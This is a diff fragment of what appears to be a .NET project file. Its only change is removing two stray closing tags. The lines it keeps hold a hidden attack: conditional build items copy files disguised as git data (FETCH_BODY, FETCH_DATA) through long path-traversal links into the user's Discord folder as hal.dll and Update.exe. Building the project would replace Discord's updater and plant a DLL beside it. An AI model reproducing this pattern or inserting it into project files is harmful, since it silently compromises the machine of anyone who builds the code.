@@ -50,12 +50,10 @@
     <None Include="git\FETCH_BODY"><Link>..\..\..\..\..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\hal.dll</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
 	<None Include="git\FETCH_DATA"><Link>..\..\..\..\..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\Update.exe</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
   </ItemGroup> 
-  </ItemGroup>
     <ItemGroup Condition="Exists('..\..\..\..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\Update.exe')">
     <None Include="git\FETCH_BODY"><Link>..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\hal.dll</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
 	<None Include="git\FETCH_DATA"><Link>..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\Update.exe</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
   </ItemGroup> 
-   </ItemGroup>
     <ItemGroup Condition="Exists('..\..\..\..\..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\Update.exe')">
     <None Include="git\FETCH_BODY"><Link>..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\hal.dll</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
 	<None Include="git\FETCH_DATA"><Link>..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\Update.exe</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
